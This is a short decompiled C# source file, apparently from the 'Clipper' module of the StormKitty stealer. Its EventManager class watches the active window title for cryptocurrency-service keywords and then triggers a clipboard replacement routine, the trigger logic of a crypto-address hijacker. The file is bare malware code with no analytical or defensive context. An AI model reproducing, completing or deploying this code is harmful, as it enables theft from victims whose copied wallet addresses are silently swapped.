﻿using System;
using StormKitty;

namespace Clipper
{
	// Token: 0x02000054 RID: 84
	internal sealed class EventManager
	{
		// Token: 0x06000133 RID: 307 RVA: 0x00009198 File Offset: 0x00007398
		public static void Action()
		{
			if (EventManager.Detect())
			{
				Clipper.Replace();
			}
		}

		// Token: 0x06000134 RID: 308 RVA: 0x000091A8 File Offset: 0x000073A8
		private static bool Detect()
		{
			foreach (string value in Config.CryptoServices)
			{
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					return true;
				}
			}
			return false;
		}
	}
}
